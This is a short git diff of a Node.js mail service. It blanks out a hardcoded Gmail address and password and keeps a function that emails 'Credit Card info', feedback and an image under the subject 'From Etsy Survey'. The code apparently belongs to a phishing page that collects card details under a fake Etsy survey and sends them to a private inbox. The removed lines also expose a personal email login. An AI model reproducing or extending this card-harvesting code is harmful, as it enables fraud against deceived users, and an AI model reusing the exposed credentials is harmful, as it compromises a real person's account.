@@ -6,15 +6,15 @@ const ABSPATH = path.dirname(process.mainModule.filename); // Absolute path to o
 const transporter = nodemailer.createTransport({ // Use an app specific password here
   service: 'Gmail',
   auth: {
-    user: 'hayanisaid1995@gmail.com',
-    pass: 'said.www.com'
+    user: '',
+    pass: ''
   }
 });
 
 exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='no file'){
 	const options = {
-    from: 'hayanisaid1995@gmail.com',
-    to: 'hayanisaid1995@gmail.com',
+    from: '',
+    to: '',
     subject: 'From Etsy Survey',
     html: `<ul>
      <li><br>Credit Card info:<b> ${cardC}</li>
